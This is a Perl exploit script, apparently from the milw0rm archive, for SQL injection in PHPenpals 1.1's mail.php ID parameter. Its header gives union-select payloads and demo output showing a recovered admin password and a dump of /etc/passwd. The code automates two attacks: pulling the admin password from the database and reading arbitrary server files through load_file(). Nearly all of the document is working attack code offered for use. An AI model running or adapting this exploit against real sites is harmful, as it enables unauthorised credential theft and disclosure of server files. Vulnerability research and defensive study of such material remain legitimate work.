<html><head><title>PHPenpals <= 1.1 (mail.php ID) Remote SQL Injection Exploit</title></head><pre>#!usr/bin/perl
#|------------------------------------------------------------------------------------------------------------------
#| -Info:
#
#| -Name: Phpenpals
#| -Version: &lt;= 1.1
#| -Site: http://sourceforge.net/projects/phpenpals/
#| -Download Script: http://sourceforge.net/project/showfiles.php?group_id=40166&amp;package_id=32303&amp;release_id=250717
#| -Bug: Sql Injection
#| -Found: by Br0ly
#| -BRAZIL &gt;D
#| -Contact: br0ly.Code@gmail.com
#|
#| -Gretz: Osirys , xs86 , 6_Bl4ck9_f0x6 , str0ke
#|
#| -p0c:
#| -SQL INJECTION:
#|
#| -http://localhost/Scripts/phpenpals/mail.php?ID=-1+union+select+1,@@version--
#| -Vuls: @array = ('profile.php?personalID=' , 'mail.php?ID=')
#|   
#| - You just need pass of the admin for login in:
#| - http://localhost/Scripts/phpenpals/admin.php
#|
#| -Exploit: Demo:
#|------------------------------------------------------------------------------------------------------------------
#|
#| perl phpenpals.txt http://localhost/Scripts/phpenpals/ 1
#|
#|  --------------------------------------
#|   -Phpenpals                     
#|   -Sql Injection                      
#|   -by Br0ly                           
#|  --------------------------------------
#|
#|[+] Getting the pass of the admin.
#|[+] Password = admin
#|
#|perl phpenpals.txt http://localhost/Scripts/phpenpals/ 2
#|
#|  --------------------------------------
#|   -Phpenpals                     
#|   -Sql Injection                      
#|   -by Br0ly                           
#|  --------------------------------------
#|
#|[*] Cat:/etc/passwd
#|     
#|
#|root:x:0:0:root:/root:/bin/bash
#|daemon:x:1:1:daemon:/usr/sbin:/bin/sh
#|bin:x:2:2:bin:/bin:/bin/sh
#|sys:x:3:3:sys:/dev:/bin/sh
#|sync:x:4:65534:sync:/bin:/bin/sync
#|games:x:5:60:games:/usr/games:/bin/sh
#|man:x:6:12:man:/var/cache/man:/bin/sh
#|lp:x:7:7:lp:/var/spool/lpd:/bin/sh
#|
#| ;D
#| And sorry for my bad english ;/
#|
 
  use IO::Socket::INET;
  use LWP::UserAgent;

  my $host      = $ARGV[0];
  my $opcao     = $ARGV[1];
  my $sql_path  = &quot;/mail.php?ID=&quot;;
 
  if (@ARGV &lt; 2) {
      &amp;banner();
      &amp;help(&quot;-1&quot;);
  }
 
  elsif(cheek($host,$opcao) == 1) {
      &amp;banner();
      &amp;xploit($host,$opcao,$sql_path);
  }
     
  else {
      &amp;banner();
      help(&quot;-2&quot;);
  }
 
  sub xploit() {
      my $host     = $_[0];
      my $opcao    = $_[1];
      my $sql_path = $_[2];
      if($opcao == 1) { &amp;adm_pass($host,$sql_path);  }
      if($opcao == 2) { &amp;file_load($host,$sql_path); } 
  }

  sub adm_pass() {
     
      print &quot;[+] Getting the pass of the admin.\n&quot;;
      my $host     = $_[0];
      my $spl_path = $_[1];
      my $sql_atk = $host.$spl_path.&quot;-1+union+select+1,concat(0x6272306c79,0x3a,password,0x3a,0x6272306c79)+from+admin--&quot;;
      my $re = get_url($sql_atk);
      if($re =~ /br0ly:(.+):br0ly/) {
    print &quot;[+] Password = $1\n&quot;;
    exit(0);
      }
      else {
    print &quot;[-] Exploit, Fail\n&quot;;
    exit(0);
     
      }
  }
 
  sub file_load() {
 
     my $host     = $_[0];
     my $spl_path = $_[1];
    
     print &quot;[*] Cat:&quot;;
     my $file = &lt;STDIN&gt;;
     chomp($file);
     $file !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    
     if ($file !~ /\/(.*)/) {
    print &quot;\n[-] Bad filename !\n&quot;;
    &amp;file_load($host,$spl_path);
     }
    
     my $fencode = hex_str($file);
     my $byte = &quot;0x&quot;;
     my $fl_atk = $host.$spl_path.&quot;-1+union+select+1,load_file(&quot;.$byte.$fencode.&quot;)--&quot;;
     my $re = get_url($fl_atk);
     my $content = tag($re);
         
     if ($content =~ /&lt;table&gt;\*\*&lt;tr&gt;&lt;td&gt;(.+)&lt;\/td&gt;&lt;td&gt;&lt;\/td&gt;&lt;\/tr&gt;/) {
    my $out = $1;
   
        $out =~ s/\$/ /g;
    $out =~ s/\*\*\*\*/ /g;
    $out =~ s/\*/\n/g;
    $out =~ s/Send/ /g;
    $out =~ s/email/ /g;
    $out =~ s/to/ /g;
        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
        print &quot;$out&quot;;
    &amp;file_load($host,$spl_path);

    if($out =~ ' ') {
      $c++;
      print &quot;[-] Can't find &quot;.$file.&quot; \n&quot;;
      if ( $c &lt; 3 ) {
        print &quot;[-] Exploit Fail\n\n&quot;;
        &amp;file_load($host,$spl_path);
      }
   
      else { exit(0); }
   
    }
      }
  
  }   

  sub get_url() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
  }

  sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
  }

  sub hex_str () {
   
    my $str_1 = $_[0];
    my $str_hex = unpack('H*', &quot;$str_1&quot;);
    return $str_hex;
   
  }

  sub cheek() {
    my $host  = $_[0];
    my $opcao = $_[1];
    if (($host =~ /http:\/\/(.*)/) &amp;&amp; (($opcao == 1 || $opcao == 2))) {
        return 1;
    }
    else {
        return 0;
    }
  }

  sub help() {

    my $error = $_[0];
    if ($error == -1) {
        print &quot;\n[-] Error, missed some arguments !\n\n&quot;;
    }
   
    elsif ($error == -2) {

        print &quot;\n[-] Error, Bad arguments !\n\n&quot;;
    }
 
    print &quot;[*] Usage : perl $0 http://localhost/phpenpals/ opcao \n&quot;;
    print &quot;    Ex:     perl $0 http://localhost/phpenpals/ 1\n&quot;;
    print &quot;[*] opcao 1 : adm pass\n&quot;;
    print &quot;[*] opcao 2 : file_disc\n&quot;;
    exit(0);
  }

  sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------------------\n&quot;.
          &quot;   -Phpenpals                       \n&quot;.
          &quot;   -Sql Injection                       \n&quot;.
          &quot;   -by Br0ly                            \n&quot;.
          &quot;  --------------------------------------\n\n&quot;;
  }

# milw0rm.com [2009-05-15]</pre></html>